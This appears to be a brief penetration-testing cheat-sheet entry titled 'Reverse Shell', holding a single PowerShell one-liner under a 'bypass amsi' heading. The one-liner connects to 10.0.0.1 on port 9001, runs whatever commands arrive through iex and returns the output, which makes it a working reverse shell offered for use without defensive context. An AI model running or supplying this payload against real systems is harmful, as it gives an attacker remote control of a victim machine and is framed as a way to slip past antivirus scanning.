# Reverse Shell

## Reverse Shell

### One liner

#### bypass amsi

```csharp
$test=[text.encoding]::ASCII;$sm=(New-Object Net.Sockets.TCPClient('10.0.0.1',9001)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=($test).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```



